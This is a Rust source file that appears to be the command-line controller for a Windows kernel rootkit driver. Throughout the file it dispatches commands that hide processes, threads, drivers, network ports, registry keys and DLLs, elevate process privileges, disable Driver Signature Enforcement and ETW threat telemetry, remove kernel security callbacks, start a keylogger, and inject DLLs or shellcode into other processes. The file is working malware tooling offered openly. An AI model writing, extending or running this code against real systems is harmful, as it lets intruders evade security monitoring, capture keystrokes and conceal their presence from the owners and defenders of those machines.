use clap::Parser;
use log::{warn, error};

use cli::*;
use modules::*;
use common::ioctls::*;
use utils::{init_logger, BANNER};

#[cfg(not(feature = "mapper"))]
use modules::registry::Registry;

#[macro_use]
mod utils;
mod cli;
mod modules;

fn main() {
    let args = Cli::parse();
    init_logger(args.verbose);
    println!("{BANNER}");

    match &args.command {
        // Process-related operations
        Commands::Process { sub_command } => {
            let mut process = Process::new();
    
            match sub_command {
                // Elevate privileges of a specific process
                ProcessCommands::Elevate { pid } => {
                    process.elevate_process(Some(pid), ELEVATE_PROCESS);
                }
                
                // Hide or unhide a process by PID
                ProcessCommands::Hide { pid } | ProcessCommands::Unhide { pid } => {
                    let hide = matches!(sub_command, ProcessCommands::Hide { .. });
                    process.hide_unhide_process(Some(pid), HIDE_UNHIDE_PROCESS, hide);
                }
                
                // Terminate a process by PID
                ProcessCommands::Terminate { pid } => {
                    process.terminate_process(Some(pid), TERMINATE_PROCESS);
                }

                // Apply or remove a signature from a process
                ProcessCommands::Signature { pid, pt, sg } => {
                    process.signature_process(Some(pid), SIGNATURE_PROCESS, sg, pt);
                }

                // Add or remove protection flags from a process (if feature "mapper" is not enabled)
                #[cfg(not(feature = "mapper"))]
                ProcessCommands::Protection { pid, add, remove } => {
                    match (add == &true, remove == &false) {
                        (true, true) => process.protection_process(Some(pid), PROTECTION_PROCESS, true),
                        (false, true) => process.protection_process(Some(pid), PROTECTION_PROCESS, false),
                        _ => error!("No action provided"),
                    }
                }

                // List running processes
                ProcessCommands::Enumerate { list, r#type } if *list => {
                    process.enumerate_process(ENUMERATION_PROCESS, r#type);
                }

                _ => error!("Invalid or unsupported process command"),
            }
        }

        // Thread-related operations
        Commands::Thread { sub_command } => {
            let thread = Thread::new();
        
            match sub_command {
                // Hide or unhide a thread by TID
                ThreadCommands::Hide { tid } | ThreadCommands::Unhide { tid } => {
                    let hide = matches!(sub_command, ThreadCommands::Hide { .. });
                    thread.hide_unhide_thread(Some(tid), HIDE_UNHIDE_THREAD, hide);
                }
        
                // Add or remove protection from a thread (if feature "mapper" is not enabled)
                #[cfg(not(feature = "mapper"))]
                ThreadCommands::Protection { tid, add, remove } => {
                    match (add == &true, remove == &false) {
                        (true, true) => thread.protection_thread(Some(tid), PROTECTION_THREAD, true),
                        (false, true) => thread.protection_thread(Some(tid), PROTECTION_THREAD, false),
                        _ => error!("No action provided"),
                    }
                }
        
                // List threads in the system
                ThreadCommands::Enumerate { list, r#type } if *list => {
                    thread.enumerate_thread(ENUMERATION_THREAD, r#type);
                }
        
                _ => error!("Invalid or unsupported thread command"),
            }
        }

        // Driver-related operations
        Commands::Driver { sub_command, hide, unhide, list, name } => {
            let driver = Driver::new();

            // List all loaded drivers
            if *list {
                return driver.enumerate_driver(ENUMERATE_DRIVER);
            }
        
            // Hide or unhide a specific driver
            if let Some(name) = name {
                if *hide || *unhide {
                    return driver.unhide_hide_driver(HIDE_UNHIDE_DRIVER, name, *hide);
                }
            }

            // Block or unblock a driver from loading
            if let Some(DriverCommands::Block { name, add, remove }) = sub_command {
                if let Some(name) = name {
                    if *add || *remove {
                        driver.block_driver(BLOCK_DRIVER, name, *add);
                    } else {
                        warn!("You must specify either --add or --remove.");
                    }
                }
            }
        }

        // Miscellaneous system functions
        Commands::Misc { sub_command } => {
            let misc = Misc::new();
        
            match sub_command {
                // Enable or disable Driver Signature Enforcement (DSE)
                MisCommands::DSE { disable, enable } => {
                    match (enable == &true, disable == &false) {
                        (true, true) => misc.dse(ENABLE_DSE, true),
                        (false, true) => misc.dse(ENABLE_DSE, false),
                        _ => error!("No action provided"),
                    }
                }

                // Start keylogger with optional output path
                MisCommands::Keylogger { file } => {
                    misc.keylogger(KEYLOGGER, file);
                }

                // Enable or disable ETWTI (ETW telemetry interception)
                MisCommands::Etwti { disable, enable } => {
                    match (enable == &true, disable == &false) {
                        (true, true) => misc.etwti(ETWTI, true),
                        (false, true) => misc.etwti(ETWTI, false),
                        _ => error!("No action provided"),
                    }
                }
            }
        }        

        // Hide or unhide TCP/UDP ports
        Commands::Network { hide, unhide, protocol, r#type, port_number } => {
            let network = Network::new();

            if *hide || *unhide {
                network.hide_unhide_port(HIDE_PORT, *protocol, *r#type, *port_number, *hide);
            } else {
                error!("No action provided. Use --hide or --unhide.");
            }
        }   

        // Registry-related operations (if feature "mapper" is not enabled)
        #[cfg(not(feature = "mapper"))]
        Commands::Registry { sub_command } => {
            let registry = Registry::new();

            match sub_command {
                // Add or remove registry protection for a key or value
                RegistryCommands::Protect { key, name, add, remove } => {
                    match (add == &true, remove == &true) {
                        (true, true) => error!("Both add and remove options cannot be specified at the same time"),
                        (true, false) | (false, true) => {
                            let action = *add;
                            let reg_type = if name.is_some() { REGISTRY_PROTECTION_VALUE } else { REGISTRY_PROTECTION_KEY };
                            let reg_name = name.clone().unwrap_or_default();

                            registry.registry_protection(reg_type, &reg_name, key, action);
                        }
                        _ => error!("Either add or remove must be specified"),
                    }
                }

                // Hide or unhide a registry key or value
                RegistryCommands::Hide { key, value } | RegistryCommands::Unhide { key, value } => {
                    let action = matches!(sub_command, RegistryCommands::Hide { .. });
                    let reg_type = if value.is_some() { HIDE_UNHIDE_VALUE } else { HIDE_UNHIDE_KEY };
                    let reg_name = value.clone().unwrap_or_default();

                    registry.registry_hide_unhide(reg_type, &reg_name, key, action);
                }
            }
        }

        // Module-related operations (DLLs loaded into processes)
        Commands::Module { sub_command } => {
            let module = Module::new();

            match sub_command {
                // List modules for a given process
                ModuleCommands::Enumerate { pid } => {
                    module.enumerate_module(ENUMERATE_MODULE, pid);
                }

                // Hide a module (DLL) from a process
                ModuleCommands::Hide { name, pid } => {
                    module.hide_module(HIDE_MODULE, name, *pid);
                }
            }
        }

        // Callback hook management (remove, restore, list)
        Commands::Callback { list, enumerate, remove, restore, callback } => {
            let callbacks = Callback::new();

            if *list || *enumerate {
                let enum_type = if *list {
                    ENUMERATE_CALLBACK
                } else {
                    ENUMERATE_REMOVED_CALLBACK
                };

                callbacks.enumerate_callback(enum_type, callback);
                return;
            }

            match (remove, restore) {
                (Some(index), None) => callbacks.remove_callback(*index, REMOVE_CALLBACK, callback),
                (None, Some(index)) => callbacks.restore_callback(*index, RESTORE_CALLBACK, callback),
                (Some(_), Some(_)) => error!("Cannot remove and restore at the same time"),
                (None, None) => error!("No action provided for callback"),
            }
        }      

        // Injection-related operations (DLL/shellcode into processes)
        Commands::Injection { sub_command } => {
            let injection = Injection::new();

            match sub_command {
                // Inject DLL using selected technique
                InjectionCommands::DLL { pid, path, r#type } => match r#type {
                    InjectionTypes::Thread => injection.injection(INJECTION_DLL_THREAD, pid, path),
                    InjectionTypes::APC => injection.injection(INJECTION_DLL_APC, pid, path),
                    InjectionTypes::ThreadHijacking => error!("Thread hijacking for DLLs is not supported"),
                },

                // Inject shellcode using selected technique
                InjectionCommands::Shellcode { pid, path, r#type } => match r#type {
                    InjectionTypes::Thread => injection.injection(INJECTION_SHELLCODE_THREAD, pid, path),
                    InjectionTypes::APC => injection.injection(INJECTION_SHELLCODE_APC, pid, path),
                    InjectionTypes::ThreadHijacking => injection.injection(INJECTION_SHELLCODE_THREAD_HIJACKING, pid, path),
                },
            }
        }
    }
}
